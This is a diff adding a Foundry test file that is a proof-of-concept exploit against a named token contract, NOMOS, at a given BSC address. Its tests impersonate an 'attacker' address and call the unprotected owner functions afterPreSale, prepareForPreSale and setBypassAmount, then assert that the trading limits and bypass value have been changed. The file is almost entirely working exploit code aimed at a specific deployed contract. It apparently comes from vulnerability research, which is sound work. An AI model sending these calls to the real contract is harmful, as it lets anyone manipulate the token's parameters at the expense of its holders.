@@ -1,0 +1,115 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the NOMOS token
+interface INOMOS {
+    function owner() external view returns (address);
+    function afterPreSale() external;
+    function prepareForPreSale() external;
+    function _maxTxAmount() external view returns (uint256);
+    function _maxWalletAmount() external view returns (uint256);
+    function _bypassAmount() external view returns (uint256);
+    function setBypassAmount(uint256 bypass) external;
+}
+
+contract ExploitTest is Test {
+    // Target contract address on BSC
+    address constant NOMOS = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
+
+    INOMOS public target;
+    address public attacker;
+
+    function setUp() public {
+        target = INOMOS(NOMOS);
+        vm.label(NOMOS, "NOMOS");
+        attacker = address(0xDeAdBeEf);
+        vm.label(attacker, "Attacker");
+
+        // Ensure attacker is not the owner
+        address currentOwner = target.owner();
+        if (currentOwner == attacker) {
+            // reassign attacker to a different address
+            attacker = address(0xC0FFEE);
+        }
+        vm.label(attacker, "Attacker");
+    }
+
+    // ============================================================
+    // Exploit: Unprotected afterPreSale() – allows any user to
+    //         change critical trading parameters.
+    // ============================================================
+    function testUnprotectedAfterPreSale() public {
+        // Record state before attack
+        uint256 maxTxBefore = target._maxTxAmount();
+        uint256 maxWalletBefore = target._maxWalletAmount();
+
+        // Pre-sale values (as per constructor and prepareForPreSale)
+        uint256 preMaxTx = 11000000000 * 1e11;
+        uint256 preMaxWallet = 11000000000 * 1e11;
+
+        // Post-sale values (defined in afterPreSale)
+        uint256 postMaxTx = 110000000 * 1e11;
+        uint256 postMaxWallet = 550000000 * 1e11;
+
+        // If the contract is already in "after pre-sale" state, we first
+        // revert to pre-sale using prepareForPreSale (also unprotected)
+        if (maxTxBefore != preMaxTx) {
+            vm.prank(attacker);
+            target.prepareForPreSale();
+            // Verify state now matches pre-sale
+            assertEq(target._maxTxAmount(), preMaxTx, "prepareForPreSale did not set maxTx to pre-sale");
+            assertEq(target._maxWalletAmount(), preMaxWallet, "prepareForPreSale did not set maxWallet to pre-sale");
+        }
+
+        // Exploit: Call afterPreSale as attacker (non-owner)
+        vm.prank(attacker);
+        target.afterPreSale();
+
+        // Verify that the critical parameters have been changed
+        assertEq(target._maxTxAmount(), postMaxTx, "afterPreSale did not update _maxTxAmount");
+        assertEq(target._maxWalletAmount(), postMaxWallet, "afterPreSale did not update _maxWalletAmount");
+
+        // Optional: demonstrate that swapAndLiquifyEnabled is now true
+        // (we cannot call the getter directly but we can infer from event)
+    }
+
+    // ============================================================
+    // Exploit: Unprotected setBypassAmount() – allows any user to
+    //         re‐route bypass‑amount logic.
+    // ============================================================
+    function testUnprotectedSetBypassAmount() public {
+        uint256 newBypass = 123456 * 1e11;
+        uint256 oldBypass = target._bypassAmount();
+
+        // Exploit: Call setBypassAmount as attacker (non-owner)
+        vm.prank(attacker);
+        target.setBypassAmount(newBypass);
+
+        // Verify the bypass amount has changed
+        assertEq(target._bypassAmount(), newBypass, "setBypassAmount did not change value");
+        // Ensure it's not the old value
+        assertTrue(target._bypassAmount() != oldBypass, "bypass amount should differ from original");
+    }
+
+    // ============================================================
+    // Combined test: both calls executed by attacker
+    // ============================================================
+    function testCombinedUnauthorizedCalls() public {
+        // As attacker, prepare for pre‑sale, then call afterPreSale,
+        // and also set bypass amount.
+        vm.startPrank(attacker);
+        target.prepareForPreSale();
+        target.afterPreSale();
+        target.setBypassAmount(1);
+        vm.stopPrank();
+
+        // Assert final state
+        assertEq(target._bypassAmount(), 1);
+        assertEq(target._maxTxAmount(), 110000000 * 1e11);
+        assertEq(target._maxWalletAmount(), 550000000 * 1e11);
+    }
+}
+```
